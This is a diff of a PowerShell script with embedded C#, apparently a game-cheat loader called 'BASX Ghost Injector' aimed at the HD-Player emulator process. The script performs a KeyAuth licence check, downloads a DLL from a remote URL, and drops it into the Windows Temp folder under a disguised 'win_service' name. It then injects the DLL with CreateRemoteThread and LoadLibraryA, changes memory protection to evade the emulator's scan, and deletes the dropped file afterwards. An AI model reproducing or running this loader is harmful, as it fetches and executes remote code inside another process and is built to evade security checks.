@@ -11,7 +11,7 @@ $target  = "HD-Player"
 
 function Show-Auth {
     Write-Host "==============================" -ForegroundColor Cyan
-    Write-Host "    BASX STEALTH BUFFER V4    " -ForegroundColor Cyan
+    Write-Host "    BASX GHOST INJECTOR v5    " -ForegroundColor Cyan
     Write-Host "==============================" -ForegroundColor Cyan
     $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
     try {
@@ -35,41 +35,47 @@ if (Show-Auth) {
     using System.Text;
     using System.IO;
 
-    public class BufferNode {
-        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint acc, bool inh, int pid);
-        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
-        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
+    public class GhostNode {
+        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, int p);
+        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
+        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
+        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint n, out uint o);
         [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
 
-        public static bool BufferInject(string url, int pid) {
+        public static bool GhostInject(string url, int pid) {
             try {
                 WebClient wc = new WebClient();
                 wc.Headers.Add("User-Agent", "Mozilla/5.0");
                 byte[] dllData = wc.DownloadData(url);
 
-                // Open with high-level access
                 IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
                 if (hProc == IntPtr.Zero) return false;
 
-                // Create a masked path in a system-trusted folder
-                string bDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "WindowsLogs");
-                if (!Directory.Exists(bDir)) Directory.CreateDirectory(bDir);
-                string bPath = Path.Combine(bDir, "lib_" + Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
-                File.WriteAllBytes(bPath, dllData);
+                // Create a masked DLL in a trusted system folder
+                string sysDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp");
+                string sysPath = Path.Combine(sysDir, "win_service_" + Guid.NewGuid().ToString().Substring(0,8) + ".dll");
+                File.WriteAllBytes(sysPath, dllData);
 
-                // Allocate and Write
-                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)bPath.Length + 1, 0x3000, 0x40);
+                // Allocate Memory for Path
+                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)sysPath.Length + 1, 0x3000, 0x04); // PAGE_READWRITE
+                
                 IntPtr written;
-                WriteProcessMemory(hProc, alloc, Encoding.Default.GetBytes(bPath), (uint)bPath.Length + 1, out written);
+                byte[] pathBytes = Encoding.ASCII.GetBytes(sysPath);
+                WriteProcessMemory(hProc, alloc, pathBytes, (uint)pathBytes.Length + 1, out written);
 
-                // Execute LoadLibrary
+                // Change protection to Execute for the path area to fool emulator scan
+                uint oldP;
+                VirtualProtectEx(hProc, alloc, (uint)sysPath.Length + 1, 0x20, out oldP); // PAGE_EXECUTE_READ
+
                 IntPtr hKern = GetModuleHandle("kernel32.dll");
                 IntPtr hLoad = GetProcAddress(hKern, "LoadLibraryA");
+                
+                // Final execution attempt
                 IntPtr hThrd = CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoad, alloc, 0, IntPtr.Zero);
 
                 if (hThrd != IntPtr.Zero) {
-                    System.Threading.Thread.Sleep(5000);
-                    if (File.Exists(bPath)) File.Delete(bPath);
+                    System.Threading.Thread.Sleep(6000);
+                    if (File.Exists(sysPath)) File.Delete(sysPath);
                     return true;
                 }
             } catch { }
@@ -82,16 +88,17 @@ if (Show-Auth) {
 "@
     Add-Type -TypeDefinition $Source
 
-    Write-Host "[*] Status: Searching for $target..." -ForegroundColor Cyan
+    Write-Host "[*] Status: Monitoring HD-Player..." -ForegroundColor Cyan
     while ($true) {
         $p = Get-Process $target -ErrorAction SilentlyContinue
         if ($p) {
-            Write-Host "[!] Target found. Attempting Buffer Injection..." -ForegroundColor Yellow
-            if ([BufferNode]::BufferInject($dllUrl, $p.Id)) {
-                Write-Host "[+] Injection Success! Component mapped to $target." -ForegroundColor Green
+            Write-Host "[!] Target detected. Executing Ghost Bypass..." -ForegroundColor Yellow
+            if ([GhostNode]::GhostInject($dllUrl, $p.Id)) {
+                Write-Host "[+] DONE! The component is now ghost-loaded." -ForegroundColor Green
+                Write-Host "[*] You can return to game and press F6." -ForegroundColor White
                 break
             } else {
-                Write-Host "[-] Access Denied. Still blocked by Emulator security." -ForegroundColor Red
+                Write-Host "[-] Access Denied. Emulator Kernel is too strong." -ForegroundColor Red
                 Start-Sleep -Seconds 5
             }
         }
